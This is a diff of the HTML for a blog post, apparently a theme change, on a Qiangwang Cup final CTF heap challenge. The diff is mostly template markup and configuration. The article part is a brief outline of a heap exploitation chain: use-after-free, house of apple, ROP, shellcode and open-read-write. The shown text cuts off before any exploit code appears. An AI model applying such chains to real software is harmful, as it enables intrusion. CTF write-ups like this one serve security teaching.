@@ -1,232 +1,910 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>强网S8-final-JP | InkeyPのblog</title><meta name="author" content="InkeyP"><meta name="copyright" content="InkeyP"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="差点二等，非常可惜，来年再战">
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="pwn">
+    
+    <meta name="author" content="InkeyP">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+        
+        
+        
+            <link rel="preconnect" href="https://registry.npmmirror.com" crossorigin>
+        
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://blog.inkey.top/202412/07/强网s8-final-jp/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:type" content="article">
 <meta property="og:title" content="强网S8-final-JP">
 <meta property="og:url" content="https://blog.inkey.top/202412/07/%E5%BC%BA%E7%BD%91S8-final-JP/index.html">
 <meta property="og:site_name" content="InkeyPのblog">
-<meta property="og:description" content="差点二等，非常可惜，来年再战">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://blog.inkey.top/2024/12/07/%E5%BC%BA%E7%BD%91S8-final-JP/qwb.jpg">
+<meta property="og:image" content="https://blog.inkey.top/images/redefine-og.webp">
 <meta property="article:published_time" content="2024-12-07T03:30:48.000Z">
-<meta property="article:modified_time" content="2024-12-07T03:34:53.236Z">
+<meta property="article:modified_time" content="2025-03-14T02:18:08.542Z">
 <meta property="article:author" content="InkeyP">
 <meta property="article:tag" content="pwn">
 <meta property="article:tag" content="强网杯">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://blog.inkey.top/2024/12/07/%E5%BC%BA%E7%BD%91S8-final-JP/qwb.jpg"><link rel="shortcut icon" href="/img/32.ico"><link rel="canonical" href="https://blog.inkey.top/202412/07/%E5%BC%BA%E7%BD%91S8-final-JP/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>
-    (() => {
-      
-    const saveToLocal = {
-      set: (key, value, ttl) => {
-        if (!ttl) return
-        const expiry = Date.now() + ttl * 86400000
-        localStorage.setItem(key, JSON.stringify({ value, expiry }))
-      },
-      get: key => {
-        const itemStr = localStorage.getItem(key)
-        if (!itemStr) return undefined
-        const { value, expiry } = JSON.parse(itemStr)
-        if (Date.now() > expiry) {
-          localStorage.removeItem(key)
-          return undefined
-        }
-        return value
-      }
-    }
-
-    window.btf = {
-      saveToLocal,
-      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
-        const script = document.createElement('script')
-        script.src = url
-        script.async = true
-        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
-        script.onload = script.onreadystatechange = () => {
-          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
-        }
-        script.onerror = reject
-        document.head.appendChild(script)
-      }),
-      getCSS: (url, id) => new Promise((resolve, reject) => {
-        const link = document.createElement('link')
-        link.rel = 'stylesheet'
-        link.href = url
-        if (id) link.id = id
-        link.onload = link.onreadystatechange = () => {
-          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
-        }
-        link.onerror = reject
-        document.head.appendChild(link)
-      }),
-      addGlobalFn: (key, fn, name = false, parent = window) => {
-        if (!false && key.startsWith('pjax')) return
-        const globalFn = parent.globalFn || {}
-        globalFn[key] = globalFn[key] || {}
-        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
-        parent.globalFn = globalFn
-      }
-    }
-  
-      
-      const activateDarkMode = () => {
-        document.documentElement.setAttribute('data-theme', 'dark')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
-        }
-      }
-      const activateLightMode = () => {
-        document.documentElement.setAttribute('data-theme', 'light')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
-        }
-      }
-
-      btf.activateDarkMode = activateDarkMode
-      btf.activateLightMode = activateLightMode
-
-      const theme = saveToLocal.get('theme')
+<meta name="twitter:image" content="https://blog.inkey.top/images/redefine-og.webp">
     
-          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/img/icon.jpg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/img/icon.jpg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/img/icon.jpg">
+    <!--- Page Info-->
+    
+    <title>
         
-      
-      const asideStatus = saveToLocal.get('aside-status')
-      if (asideStatus !== undefined) {
-        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
-      }
+            强网S8-final-JP | InkeyPのblog
+        
+    </title>
+
+    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fonts/Chillax/chillax.css">
+
+    <!--- Inject Part-->
     
-      
-    const detectApple = () => {
-      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
-        document.documentElement.classList.add('apple')
-      }
-    }
-    detectApple()
-  
-    })()
-  </script><script>const GLOBAL_CONFIG = {
-  root: '/',
-  algolia: undefined,
-  localSearch: undefined,
-  translate: undefined,
-  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
-  copy: {
-    success: '复制成功',
-    error: '复制失败',
-    noSupport: '浏览器不支持'
-  },
-  relativeDate: {
-    homepage: false,
-    post: false
-  },
-  runtime: '',
-  dateSuffix: {
-    just: '刚刚',
-    min: '分钟前',
-    hour: '小时前',
-    day: '天前',
-    month: '个月前'
-  },
-  copyright: undefined,
-  lightbox: 'null',
-  Snackbar: {"chs_to_cht":"已切换为繁体中文","cht_to_chs":"已切换为简体中文","day_to_night":"已切换为深色模式","night_to_day":"已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#2d3035","position":"bottom-left"},
-  infinitegrid: {
-    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
-    buttonText: '加载更多'
-  },
-  isPhotoFigcaption: false,
-  islazyload: false,
-  isAnchor: false,
-  percent: {
-    toc: true,
-    rightside: false,
-  },
-  autoDarkmode: false
-}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
-  title: '强网S8-final-JP',
-  isPost: true,
-  isHome: false,
-  isHighlightShrink: false,
-  isToc: true,
-  isShuoshuo: false
-}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/loading.gif" data-original="/img/icon.jpg" onerror="onerror=null;src='/img/icon.jpg'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/loading.gif" data-original="/img/icon.jpg" alt="Logo"><span class="site-name">InkeyPのblog</span></a><a class="nav-page-title" href="/"><span class="site-name">强网S8-final-JP</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">强网S8-final-JP</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-12-07T03:30:48.000Z" title="发表于 2024-12-07 11:30:48">2024-12-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-12-07T03:34:53.236Z" title="更新于 2024-12-07 11:34:53">2024-12-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pwn/">pwn</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="container post-content" id="article-container"><h1 id="强网S8-final-WP"><a href="#强网S8-final-WP" class="headerlink" title="强网S8 final WP"></a>强网S8 final WP</h1><h2 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h2><p>uaf先修改aes的key</p>
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/css/build/tailwind.css">
+    
+
+    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fonts/GeistMono/geist-mono.css">
+    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fonts/Geist/geist.css">
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"blog.inkey.top","root":"/","language":"zh-CN","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":true,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":true,"recommendation":{"enable":true,"title":"绝赞文章","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/img/cover/34.png","dark":"/img/index_img.png"},"title":"InkeyPのblog","subtitle":{"text":["可以打一辈子CTF吗"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#28476f","dark":"#e6f1d9"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/InkeyP","instagram":null,"zhihu":null,"twitter":null,"email":"1844598344@qq.com"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Friends":{"path":"/links","icon":"fa-regular fa-link"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about"}}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/11/29 11:45:14"};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fontawesome/fontawesome.min.css">
+    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fontawesome/brands.min.css">
+    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fontawesome/solid.min.css">
+    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fontawesome/regular.min.css">
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+                <a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/">
+                    <img src="/img/icon.jpg" class="w-full h-full rounded-sm">
+                </a>
+            
+            <a class="logo-title" href="/">
+                
+                InkeyPのblog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    首页
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/links"
+                                        >
+                                    <i class="fa-regular fa-link fa-fw"></i>
+                                    友情链接
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown"
+                                   href="#"
+                                        onClick=&#34;return false;&#34;>
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    关于
+                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                        
+                                            <li>
+                                                <a href="/about">
+                                                    ME
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                首页
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/links"
+                        >
+                            <span>
+                                友情链接
+                            </span>
+                            
+                                <i class="fa-regular fa-link fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
+                        
+                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                             navbar-data-toggle="submenu-About"
+                        >
+                            <span>
+                                关于
+                            </span>
+                            
+                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
+                            
+                        </div>
+                        
+
+                        
+                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About">
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/about">ME</a>
+                                    </div>
+                                
+                            </div>
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/archives"
+                        >
+                            <span>Archives</span>
+                            <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/tags"
+                        >
+                            <span>Tags</span>
+                            <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/categories"
+                        >
+                            <span>Categories</span>
+                            <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">9</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">1</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">12</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			
+			
+			<img src="/202412/07/%E5%BC%BA%E7%BD%91S8-final-JP/qwb.jpg" alt="强网S8-final-JP" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75" />
+			
+			<div class="w-full flex items-center absolute bottom-0 justify-start">
+				<h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-semibold backdrop-blur-lg rounded-xl border border-border-color ">强网S8-final-JP</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="https://avatars.githubusercontent.com/u/39005478?s=800">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">InkeyP</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-12-07 11:30:48</span>
+        <span class="mobile">2024-12-07 11:30:48</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-03-14 10:18:08</span>
+            <span class="mobile">2025-03-14 10:18:08</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/pwn/">pwn</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/pwn/">pwn</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E5%BC%BA%E7%BD%91%E6%9D%AF/">强网杯</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>1.7k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>10 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h1 id="强网S8-final-WP"><a href="#强网S8-final-WP" class="headerlink" title="强网S8 final WP"></a>强网S8 final WP</h1><h2 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h2><p>uaf先修改aes的key</p>
 <p>然后house of apple，ROP，写shellcode</p>
 <p>最后orw</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span 